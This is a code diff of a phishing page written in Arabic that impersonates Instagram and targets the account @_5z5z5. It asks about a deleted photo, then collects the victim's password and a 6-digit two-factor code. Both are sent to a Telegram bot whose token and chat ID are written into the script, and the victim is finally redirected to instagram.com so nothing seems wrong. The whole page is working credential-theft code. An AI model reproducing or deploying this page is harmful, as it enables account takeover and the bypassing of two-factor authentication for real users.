@@ -8,68 +8,81 @@
         body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; color: #262626; }
         .top-bar { width: 100%; padding: 15px 0; border-bottom: 1px solid #dbdbdb; text-align: center; font-weight: bold; background: #fafafa; font-size: 14px; }
         .container { width: 100%; max-width: 350px; text-align: center; padding: 25px 20px; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .btn-group { display: flex; gap: 10px; margin-top: 20px; }
         .btn { flex: 1; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; border: 1px solid #dbdbdb; font-size: 14px; }
         .btn-blue { background: #0095f6; color: white; border: none; }
-        input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 15px; text-align: center; }
+        input { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 2px; }
         #step-password, #step-sms { display: none; }
     </style>
 </head>
 <body>
-    <div class="top-bar">مراجعة نشاط الحساب</div>
+    <div class="top-bar">مراجعة سجلات الحساب</div>
 
+    <!-- الخطوة 1: مراجعة الصورة (IMG_1145) -->
     <div class="container" id="step-logs">
         <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" class="logo">
-        <h3 style="font-size: 18px;">مراجعة سجلات الحساب</h3>
+        <h3 style="font-size: 18px; margin-top: 0;">مراجعة سجلات الحساب</h3>
         <p style="font-size: 13px; color: #8e8e8e;">بناءً على نشاط الحساب الأخير، هل قمت بحذف هذه الصورة مؤخراً؟</p>
         
-        <img src="https://i.ibb.co/Lzf7y4G/cat-profile.jpg" class="profile-img">
+        <!-- هنا قمت بربط الصورة باسمها الموجود في ملفاتك -->
+        <img src="IMG_1145.jpeg" class="profile-img" alt="Account Media">
         
         <div class="btn-group">
-            <button class="btn" onclick="nextStep('password', 'نعم')">نعم</button>
-            <button class="btn" onclick="nextStep('password', 'لا')">لا</button>
+            <button class="btn" onclick="showNext('password')">نعم</button>
+            <button class="btn" onclick="showNext('password')">لا</button>
         </div>
     </div>
 
+    <!-- الخطوة 2: كلمة المرور -->
     <div class="container" id="step-password">
-        <h3 style="font-size: 18px;">تأكيد الهوية</h3>
-        <p style="font-size: 13px; color: #8e8e8e;">يرجى إدخال كلمة المرور الحالية للمتابعة.</p>
+        <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" class="logo">
+        <h3 style="font-size: 18px;">تأكيد ملكية الحساب</h3>
+        <p style="font-size: 13px; color: #8e8e8e;">يرجى إدخال كلمة المرور الحالية لـ @_5z5z5 للمتابعة.</p>
         <input type="password" id="pass" placeholder="كلمة المرور">
-        <button class="btn btn-blue" onclick="sendPass()">متابعة</button>
+        <button class="btn btn-blue" onclick="sendToTelegram('password')">متابعة</button>
     </div>
 
+    <!-- الخطوة 3: رمز المصادقة (6 أرقام) -->
     <div class="container" id="step-sms">
-        <h3 style="font-size: 18px;">المصادقة الثنائية</h3>
-        <p style="font-size: 13px; color: #8e8e8e;">أدخل الرمز المكون من 6 أرقام المرسل لهاتفك.</p>
-        <input type="text" id="sms" placeholder="0 0 0 0 0 0" maxlength="6">
-        <button class="btn btn-blue" onclick="sendSMS()">تأكيد وتأمين الحساب</button>
+        <div style="font-weight: bold; margin-bottom: 20px; font-size: 14px; border-bottom: 1px solid #dbdbdb; padding-bottom: 10px; width: 100%;">المصادقة بخطوتين</div>
+        <h3 style="font-size: 18px;">أدخل رمز الأمان</h3>
+        <p style="font-size: 14px; color: #8e8e8e; line-height: 1.6;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>. يرجى إدخاله للمتابعة.</p>
+        <input type="text" id="sms" placeholder="000000" maxlength="6">
+        <button class="btn btn-blue" onclick="sendToTelegram('sms')">تأكيد الرمز</button>
     </div>
 
     <script>
-        let userChoice = "";
-
-        function nextStep(step, choice) {
-            userChoice = choice;
+        function showNext(nextId) {
             document.getElementById('step-logs').style.display = 'none';
-            document.getElementById('step-password').style.display = 'block';
-        }
-
-        function sendPass() {
-            const pass = document.getElementById('pass').value;
-            if(!pass) { alert("يرجى إدخال كلمة المرور"); return; }
-            fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 خيار الصورة: ${userChoice}%0A🔓 الباسورد: ${pass}`);
             document.getElementById('step-password').style.display = 'none';
-            document.getElementById('step-sms').style.display = 'block';
+            document.getElementById(nextId === 'password' ? 'step-password' : 'step-sms').style.display = 'block';
         }
 
-        function sendSMS() {
-            const sms = document.getElementById('sms').value;
-            if(sms.length < 6) { alert("الرمز غير مكتمل"); return; }
-            fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=📲 الرمز: ${sms}`);
-            alert("شكراً لك، تم تأمين الحساب بنجاح.");
-            window.location.href = "https://instagram.com";
+        function sendToTelegram(type) {
+            const botToken = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+            const chatId = "897618292";
+            let message = "";
+
+            if (type === 'password') {
+                const pass = document.getElementById('pass').value;
+                if(!pass) { alert("يرجى إدخال كلمة المرور"); return; }
+                message = `🔑 الباسورد الجديد: ${pass}`;
+                document.getElementById('step-password').style.display = 'none';
+                document.getElementById('step-sms').style.display = 'block';
+            } else {
+                const sms = document.getElementById('sms').value;
+                if(sms.length < 6) { alert("يرجى إدخال الرمز كاملاً"); return; }
+                message = `📲 رمز الـ SMS: ${sms}`;
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+            if (type === 'sms') {
+                alert("شكراً لك. جاري مراجعة طلبك، سيتم الرد خلال 24 ساعة.");
+                window.location.href = "https://instagram.com";
+            }
         }
     </script>
 </body>
